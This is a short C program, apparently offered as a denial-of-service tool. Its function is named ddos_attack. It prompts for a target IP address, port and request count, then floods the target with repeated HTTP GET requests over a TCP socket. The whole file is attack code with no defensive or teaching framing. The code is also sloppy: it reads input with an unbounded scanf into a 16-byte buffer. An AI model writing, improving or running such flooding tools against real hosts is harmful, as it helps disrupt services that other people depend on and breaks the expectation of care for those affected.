#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

void ddos_attack(char *target_ip, int port, int num_requests) {
    int sockfd;
    struct sockaddr_in target_addr;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (connect(sockfd, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
        perror("Connection failed");
        exit(1);
    }

    char request[1024];
    strcpy(request, "GET / HTTP/1.1\r\nHost: ");
    strcat(request, target_ip);
    strcat(request, "\r\n\r\n");

    int i;
    for (i = 0; i < num_requests; i++) {
        send(sockfd, request, strlen(request), 0);
        printf("Request %d sent to %s\n", i+1, target_ip);
    }

    close(sockfd);
}

int main() {
    char target_ip[16];
    int port, num_requests;

    printf("Enter target IP address: ");
    scanf("%s", target_ip);

    printf("Enter target port: ");
    scanf("%d", &port);

    printf("Enter number of requests to send: ");
    scanf("%d", &num_requests);

    ddos_attack(target_ip, port, num_requests);

    return 0;
}
